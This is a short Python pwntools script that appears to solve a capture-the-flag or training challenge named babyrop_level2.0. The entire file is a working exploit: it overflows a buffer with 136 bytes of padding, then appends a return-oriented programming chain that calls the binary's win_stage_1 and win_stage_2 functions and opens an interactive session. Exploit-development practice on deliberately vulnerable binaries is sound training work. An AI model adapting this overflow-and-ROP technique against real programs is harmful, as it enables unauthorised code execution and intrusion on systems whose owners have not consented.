from pwn import *

elf = ELF('/challenge/babyrop_level2.0')
rop = ROP(elf)
rop.call(p64(elf.sym.win_stage_1))
rop.call(p64(elf.sym.win_stage_2))
offset_ret = 136
payload = b'A' * offset_ret + rop.chain()

proc = process('/challenge/babyrop_level2.0')
proc.recvuntil(b').\n')
proc.send(payload)
proc.interactive()
